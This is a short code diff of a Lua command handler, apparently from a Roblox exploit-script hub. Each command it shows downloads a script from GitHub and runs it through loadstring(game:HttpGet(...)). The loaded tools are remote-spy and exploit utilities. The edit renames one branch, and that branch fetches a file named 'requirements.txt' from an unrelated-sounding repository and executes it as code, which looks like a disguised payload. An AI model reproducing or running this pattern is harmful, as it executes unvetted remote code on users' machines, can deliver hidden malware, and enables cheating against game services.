@@ -51,7 +51,7 @@ return function(scriptBox, player)
             loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Test/raw/main/cobalt.lua"))()
         elseif code == ";sigma" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/depthso/Sigma-Spy/refs/heads/main/Main.lua"))()
-        elseif code == ";sspy" then
+        elseif code == ";sspym" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/wfrefdewwss/Discord-Custom-Status-24-7/refs/heads/main/requirements.txt"))()
         elseif code == ";sspy" then
             loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
